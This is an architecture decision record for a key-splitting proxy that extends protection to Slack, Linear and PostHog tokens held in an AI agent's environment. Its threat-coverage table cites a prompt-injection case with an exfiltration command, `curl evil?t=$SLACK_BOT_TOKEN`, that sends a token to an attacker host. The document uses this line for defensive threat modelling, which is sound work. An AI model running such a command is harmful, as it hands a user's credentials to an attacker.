# ADR-002: Non-LLM bearer credentials ("tool keys")

- **Status:** Proposed
- **Date:** 2026-10-22
- **Epic:** [WOR-968](https://linear.app/plumbusai/issue/WOR-968), docs ticket [WOR-987](https://linear.app/plumbusai/issue/WOR-987)
- **Inputs:** [research/non-llm-keys/README.md](../research/non-llm-keys/README.md) (spike review, code
  inventory, prior art, client wire facts). Delivery plan: [planning/wor-968-tool-keys.md](../planning/wor-968-tool-keys.md).

`CONTRIBUTING.md` asks for a design discussion before adding a provider adapter. This ADR is that discussion.

## Context

Worthless splits an LLM API key into shard-A (left in `.env`) and shard-B (sealed on the box). The proxy
rebuilds the real key only after the rules engine approves the request. The headline is a hard spend cap for
LLM keys.

An AI agent's `.env` holds more than LLM keys. It also holds the keys for the tools it drives: Slack, Linear,
PostHog. Today `lock` doesn't recognise them and prints "No unprotected API keys found." That is a false
all-clear sitting next to a live Slack token.

An outside spike proposed a `PassthroughAdapter`. It found the three LLM-specific spots in the proxy, but it
would have failed on its first live request: `enroll` never outputs shard-A, the row's `base_url` is NULL,
query strings and trailing slashes are dropped, Linear's raw `Authorization` header is rejected, and LLM
metering cuts a Slack bot off at about 7,800 calls. The research note lists all nine gaps with line refs.

Gate B has since driven the real Slack, Linear and PostHog SDKs against a local capture server with fake
tokens. It confirmed D3, D5 and D6 below and raised one open question about PostHog. Nothing has yet run
against the real vendors with a real token (the "live leg").

Our first design partner is **Mappy**, an AI-agent VM.

**Owner decisions (2026-10-22)** this ADR builds on:

1. Product feature, with Mappy as first design partner.
2. Build only for the **leaked-file** threat. Prompt injection and runaway use get tickets only (F7, F8).
3. v1 covers **Slack, Linear and PostHog `phx_`**.
4. A separate trust domain (F6) **gates Mappy go-live**.
5. Ship as **experimental**. "Hard spend cap for LLM keys" stays the headline.
6. Whether Mappy uses Slack Socket Mode (`xapp-`) is answered by the leak inventory (Gate A).

## Decision

### D1. A curated vendor list; protocol comes from the in-code prefix table, never from TOML

- The prefix table in `cli/key_patterns.py` gains `slack: [xoxb-, xoxp-]`, `linear: [lin_api_]`,
  `posthog: [phx_]`.
- A key is a tool key **only** because its prefix is in that table. The bundled `providers.toml` gains the three
  upstream URLs, nothing more.
- Protocol strings are validated when TOML is parsed. A TOML entry, bundled or user, cannot declare
  `passthrough`, and `providers register` cannot create one.

**Why:** passthrough skips LLM metering and the LLM error sanitizer. A hand-edited `~/.worthless/providers.toml`
must never be able to flip an AI key into that mode. A user-declared generic protocol can come later, once two
curated vendors have proved the shape ([WOR-998](https://linear.app/plumbusai/issue/WOR-998)).

### D2. One `passthrough` protocol, stored at lock time

- Every tool key is stored with `shards.provider = "passthrough"`. The vendor lives in the alias
  (`slack-3f9a1c2e`) and the registry entry. No DB migration.
- The proxy gets a small protocol table, `ProtocolSpec(name, metered, extract_credential, verbatim_errors)`,
  looked up by the stored protocol. An unknown protocol gets the uniform 401 before decrypt.
- LLM aliases are untouched: they keep path dispatch (`get_adapter(path)`) and `_extract_alias_and_path`.
- A passthrough request is forwarded as sent: method, raw path from `scope["raw_path"]` (with `root_path`
  dropped), query string, and body bytes. `build_upstream_url(base_url, raw_api_path, query)` runs **before**
  `rules.evaluate`, so bad paths don't spend rate-limit tokens. Dot segments get the uniform 401 before decrypt,
  because httpx collapses `..` and would let a path escape the base.
- Decrypt and reconstruct go through one shared helper, so `ipc.open` keeps a single call site after the gate.

**Why one protocol, not one adapter per vendor:** the vendors differ only in auth form and base URL, and both
are known at lock time. Per-vendor code only earns its place once we police operations (F7). The spike's
vendor-keyed dict also never matches, because `lock` stores the protocol, not the vendor.

### D3. Mirrored auth

- The proxy accepts shard-A as `Authorization: Bearer <shard-A>` or as raw `Authorization: <shard-A>`, and sends
  the real key upstream **in the same form**.
- Basic auth, `x-api-key`, and values containing spaces get the uniform 401 before decrypt.
- Both inbound credential headers are removed before the real one is set.

**Why:** Slack and PostHog use Bearer; Linear personal keys go raw. Gate B saw no SDK put the secret anywhere
but `Authorization`. Mirroring the SDK's own choice needs no per-vendor auth config, and leaves no setting that
could aim the real key at a different header. Slack's docs also allow the token as a POST body `token=` field;
`slack_sdk` never does that, and a client that does gets the uniform 401, which fails closed.

### D4. Unmetered gate: rate limit only, until request budgets

- `RulesEngine.evaluate(..., metered=...)`. `SpendCapRule` and `TokenBudgetRule` declare
  `meters_tokens = True` and are skipped for passthrough.
- Passthrough places no reservation, extracts no usage, writes no `spend_log` or `pending_charges` row, and logs
  no usage warning.
- `RateLimitRule` still runs (default 100 req/s per alias) and still returns 429 + `Retry-After`.
- `metered` defaults to `True`. It is derived from the stored protocol, which D1 ties to the prefix table, so
  no config edit can make an AI key unmetered.

**Why:** a Slack response has no `usage`. Today the default 1B-token cap plus the 128k floor on unreadable
usage bills each call as 128,000 tokens, and call ~7,813 gets a 402. The "charge the maximum when usage is
unreadable" rule stops cap-dodging on AI keys, so it stays for them.

**Accepted risk:** whoever holds the *active* shard-A and can reach the proxy is bounded only by the rate limit.
This is non-goal #9 ("replay of the currently active shard-A") with a larger blast radius. It stays that way
until request budgets ship (F8a, [WOR-978](https://linear.app/plumbusai/issue/WOR-978)). Budgets need the
pre-gate shard-A check first ([WOR-991](https://linear.app/plumbusai/issue/WOR-991)), or anyone who knows the
alias could drain them. The public docs must say so (PR4a).

### D5. Verbatim upstream errors; the LLM sanitizer is unchanged

- For passthrough, the upstream status, body, `Retry-After` and `X-RateLimit-*` headers reach the client as sent.
  Slack's `200 {"ok": false}` and Linear's `400 RATELIMITED` arrive intact, so each SDK's own error handling and
  back-off still work.
- Still enforced: `set-cookie` is stripped; any upstream 3xx becomes a 502, with no `Location` rewrite. Gate B
  found no SDK flow that needs a redirect, saw a 302 turn POSTs into body-less GETs, and saw sync `slack_sdk`
  keep the Bearer header across hosts; a body over the size cap becomes a 502, never a truncated body; the proxy never
  retries, so one inbound request makes exactly one upstream call.
- The proxy's **own** refusals (auth, routing, validation) stay byte-identical to `_uniform_401`.
- `_sanitize_upstream_error` keeps doing what it does for LLM aliases. Whether LLM agents should see the
  provider's real error is a separate question, tracked in WOR-729.

**Why:** the sanitizer was built so LLM error bodies don't echo detail back. Here it turns "channel not found"
and "rate limited" into the same opaque body, and the SDK can't recover. A verbatim error tells the caller
nothing it couldn't learn by making the same call through the proxy. Scrubbing credentials out of 4xx and 2xx
bodies is F7's job ([WOR-977](https://linear.app/plumbusai/issue/WOR-977)).

### D6. `<STEM>_BASE_URL` naming and a one-line client snippet

- For passthrough only, the proxy URL goes in `<STEM>_BASE_URL`, where the stem is the key's variable name minus
  its credential suffix (`SLACK_BOT_TOKEN` → `SLACK_BOT_BASE_URL`, `LINEAR_API_KEY` → `LINEAR_BASE_URL`). PR3
  pins the exact suffix list in tests.
- If that variable already exists for something else, lock refuses. It never writes `OPENAI_BASE_URL` for a
  tool key. The URL has no `/v1`.
- `lock` prints the one line to paste, with the vendor default as the fallback:

  ```python
  WebClient(token=..., base_url=os.environ.get("SLACK_BOT_BASE_URL", "https://slack.com/api/"))
  ```

- Two snippet details from Gate B: the async Slack client ignores `NO_PROXY`, so on a host with `HTTPS_PROXY`
  its snippet also sets `client.proxy = None`; and `@linear/sdk` allows plain `http://` only for loopback, so
  the Linear URL must be `127.0.0.1` or `localhost`.

**Why:** the SDKs take a base URL as a constructor argument; Gate B confirmed none of them reads one from the
environment. So
"no code changes" isn't true for tool keys; "one line per tool" replaces it. Keeping the vendor default in the
snippet is what makes `unlock` a rollback with no redeploy: unlock removes the variable and the client goes
straight to the vendor again.

### D7. Experimental, behind `--tool-keys`

- `worthless lock --tool-keys` locks tool keys. Without the flag, `lock` **warns** about each tool key it finds
  and names the flag. It never prints "No unprotected API keys found." while a tool key is in the file.
- Tokens it can't protect are refused **with a reason**: `xapp-`, `xoxe-`, `xoxe.xoxb-`/`xoxe.xoxp-`, and Slack
  signing secrets. A refused *secret* left in the file suppresses the "You're protected" verdict, using the same
  mechanism that already does this for skipped OAuth tokens (`worthless-7jn2`, `lock.py:2549`). `phc_` is refused
  but doesn't suppress the verdict, because it is public.
- After a tool-key lock, the "Next:" line points at the snippet, not at `wrap`. `wrap` skips passthrough aliases
  in v1 ([WOR-993](https://linear.app/plumbusai/issue/WOR-993)).
- README positioning changes only after Mappy meets its success criteria (PR4b).

### D8. An upstream URL must match the key's protocol

- `_resolve_upstream_base_url` and `lookup_by_name` refuse a `*_BASE_URL` or registry URL whose protocol differs
  from the key's.
- `_validate_upstream_base_url` moves out of `cli/commands/lock.py` into a neutral `worthless/upstream_url.py`,
  so the proxy can re-check the URL at request time without importing the CLI (which would load the splitter,
  WOR-309).

**Why:** today `lock` accepts any *registered* URL in `*_BASE_URL`, whatever its protocol. With tool keys, that
would let `SLACK_BOT_BASE_URL=https://api.openai.com/v1` send a Slack token to OpenAI. The same hole exists today
between the two LLM protocols.

### D9. The F6 trust-domain recipe gates design-partner go-live

Mappy does not go live until R1 ([WOR-986](https://linear.app/plumbusai/issue/WOR-986)) is applied and its
verification script passes **as the agent user**:

- the agent runs under its own uid or container;
- `~/.worthless` and the Fernet key are unreadable to it and kept out of agent-visible snapshots and backups;
- the proxy listens on loopback only;
- `worthless unlock` fails as the agent user;
- optionally, a default-deny egress allowlist.

The script expects `EACCES` on the store, a failing unlock, and a working proxy call.

**Why:** on a headless VM the Fernet key file sits next to the DB. One snapshot of the agent's home then holds
both halves, and the v1 promise fails on exactly the machine we are building it for.

## Open decision: PostHog in v1

Owner decision 3 put PostHog `phx_` in v1. Gate B found something that decision didn't know: `posthog-python`
sends secret-key calls (`Bearer phx_…`) and **uncredentialed** traffic (event capture, `/flags`, automatic
`$feature_flag_called` events, all carrying only the public `phc_` key) to the **same** `host`. Point that
client at the proxy and D3's "no credential → uniform 401" silently drops capture and flags. PostHog's SDK never
raises, so nobody would notice.

| Option | Cost |
|---|---|
| **A. Defer PostHog** to v1.1; ship Slack and Linear | Smallest change. Mappy's rollout already adds PostHog last (week 3) |
| **B. Per-protocol no-credential path:** forward an allow-list of paths (`/batch/`, `/i/v0/e/`, `/flags/`) without injecting a key | The proxy starts forwarding unauthenticated requests, a new invariant to defend and test |
| **C. Keep PostHog only for direct API callers:** if Gate A shows Mappy calls PostHog's private API with a plain HTTP client, not through `posthog-python`'s capture/flags, nothing else shares the base URL | No proxy change, but it depends on how Mappy calls PostHog, and the snippet must warn SDK users |

**Recommendation:** A, unless Gate A shows C applies. B is worth doing only once a second vendor needs it.

## When the protection holds

| Leak path | Protected? |
|---|---|
| `.env`, git history, CI log, transcript or screenshot leaves the box | **Yes.** It holds only shard-A, and the vendor rejects it. |
| Prompt injection *exfiltrates* the env (`curl evil?t=$SLACK_BOT_TOKEN`) | **Yes.** Shard-A is useless off the box, as long as the proxy listens on loopback only. This is an undersold win. |
| Whole-home or VM snapshot or backup that includes `~/.worthless` | **No**, unless F6 is in place. On a headless VM the Fernet key file sits next to the DB, so one snapshot holds both halves. |
| Code running on the box *uses* the key through the proxy | **No.** That's a ticket (F7/F8). |
| Shard-A is reachable at the proxy (non-goal #9) | Bounded only by the rate limit until request budgets (F8) ship. The docs must say so. |

## Alternatives considered

| Alternative | What it gives | How it compares |
|---|---|---|
| **`op run`** (or any secret manager that injects env at exec) | Secret at rest in a vault | At runtime the real key is in the process env, `/proc/<pid>/environ`, and any transcript or crash dump that captures env. With worthless those hold shard-A. Complementary: a vault can still hold the original token for recovery. |
| **Egress proxy that injects the credential** (Infisical Agent Vault, Secretless Broker, Aembit, Managed Agents env placeholders) | Client holds a placeholder; the proxy swaps in the real token | **Roughly equal** on the leaked-file threat. They sit at the network layer (`HTTPS_PROXY`, often with a trusted interception CA), as a sidecar, or on a hosted platform; worthless needs one line per vendor and no CA. Worthless's edge is reuse: the split, sidecar, gate, tripwire and lock/unlock already exist and run locally. None of them stops a compromised client using the key either. If a user already runs one, worthless adds little for tool keys. |
| **Slack token rotation** (12h `xoxe.xoxb-…` access tokens + refresh) | A leaked token dies within 12h | Conflicts with locking: the refresh replaces the value lock split. So rotating tokens are refused with a reason. Teams already rotating should keep rotating. |
| **Scoped tokens** | Smaller blast radius | Always do it (rollout step 1). It limits what a leaked token can do, not whether it works. Complementary. |
| **One adapter per vendor** (the spike) | Vendor-specific behaviour | More code for differences that are data (auth form, URL). Its vendor-keyed dispatch never matches a `lock`-made row. Rejected. |
| **User-declared generic protocol now** | Any bearer API | A TOML edit could make an AI key unmetered and unsanitized. Deferred to WOR-998. |
| **Do nothing** | No new surface | Leaves the false all-clear and live tool tokens in `.env`. Rejected by owner decision 1. |

## Consequences

**Good**

- A leaked `.env`, git history, CI log, transcript or screenshot that holds a Slack, Linear or PostHog key is
  dead off the box.
- `lock` stops issuing a false all-clear when tool keys are present.
- The LLM paths don't change: path dispatch, the sanitizer, metering and caps stay as they are, and the existing
  openai/anthropic/openrouter lock tests stay green unchanged.
- Bugs found on the way ship now as PR0, for LLM users too: the extra credential header forwarded upstream,
  the non-dict `usage` crash, and `unlock` removing the wrong `*_BASE_URL` for OpenRouter.

**Costs and accepted risks**

- One code line per vendor. The rollback only works if the client keeps the snippet's fallback default.
- Use of a tool key by anyone holding its active shard-A at the proxy is bounded only by the rate limit until
  F8a.
- The proxy becomes a single point of failure for the agent's tools. Mappy's rollout needs `worthless service
  install` with a restart policy and health check, and an outage drill.
- The proxy handler gains a second branch. The gate-order guarantee moves from a source-text check to an AST
  check: exactly one `ipc.open`, after `evaluate`.
- If Mappy depends on Socket Mode (`xapp-`) or rotating tokens, v1 does not protect those tokens. Gate A
  answers this before code.
- "No code changes" is no longer a blanket claim; the tool-keys docs say "one line per tool".

**Neutral**

- No DB migration. `enroll` and `wrap` don't support tool keys in v1
  ([WOR-992](https://linear.app/plumbusai/issue/WOR-992), [WOR-993](https://linear.app/plumbusai/issue/WOR-993)).

## Out of scope

| Item | Why |
|---|---|
| `phc_` (PostHog project key) | Public by design |
| `xapp-` (Slack app-level / Socket Mode) | Opens a WebSocket, not a request/response call |
| `xoxe-`, `xoxe.xoxb-`, `xoxe.xoxp-`, `xoxe.xapp-` (Slack refresh and rotating tokens) | The value changes every 12h, and Slack doesn't let an app turn rotation off once it's on |
| `xwfp-` (Slack workflow "just in time" tokens) | Short-lived by design |
| `lin_oauth_` (Linear OAuth access tokens) | Refresh-based, like Slack rotation |
| Other rotating or OAuth tokens, and OAuth flows in general | Same reason; refresh would have to live in the proxy |
| `AIza` Google keys | Commonly sent as a `?key=` query parameter, not a header |
| GCP service-account JSON | Not a bearer token; it mints OAuth tokens, often over gRPC |
| Webhooks (e.g. Slack incoming-webhook URLs) | The secret is in the URL path ([WOR-997](https://linear.app/plumbusai/issue/WOR-997)) |
| Browser clients / CORS | Shard-A would ship to the browser, and the proxy is loopback-only |
| Per-operation policy, approvals, response scrubbing | F7 ([WOR-977](https://linear.app/plumbusai/issue/WOR-977)) |
| Request budgets, pause, audit log | F8 ([WOR-978](https://linear.app/plumbusai/issue/WOR-978)) |

## Gates before code

- **Gate A** ([WOR-969](https://linear.app/plumbusai/issue/WOR-969)): Mappy's real leak artifacts, sorted by the
  table above, and which Slack/Linear/PostHog tokens and scopes exist. If partial files leaving the box are not
  the main leak path, stop and revisit this ADR.
  Because Slack rotation can't be turned off once enabled, Gate A must also check whether Mappy's Slack app
  has rotation on; if it does, v1 cannot protect that token at all.
- **Gate B** ([WOR-970](https://linear.app/plumbusai/issue/WOR-970)), **done with fake tokens:** a wire capture of
  `slack_sdk` 3.45.0 (sync, async, `files_upload_v2`), `@linear/sdk` 99.0.0 and `posthog-python` 7.75.4. The
  results are in the research note, section 4. **Still to run:** the live leg with test-workspace tokens, to
  confirm the real status of Slack's `ok: false`, Linear's real `RATELIMITED` body, and which PostHog host
  serves what.
- **PostHog decision** (below).
- **Wording:** the owner approves "one line per tool" in place of "no code changes" for tool keys.

## References

- Research: [research/non-llm-keys/README.md](../research/non-llm-keys/README.md)
- Plan: [planning/wor-968-tool-keys.md](../planning/wor-968-tool-keys.md)
- `docs/security.md`, "Threat model: non-goals" (#1 compromised client, #9 replay of the active shard-A)
- `CONTRIBUTING-security.md`: SR-03 (gate before reconstruct), SR-05 (logging denylist), SR-09 (shard-A never
  at rest in the proxy), SR-11 (client transport only), SR-12 (format-preserving split)
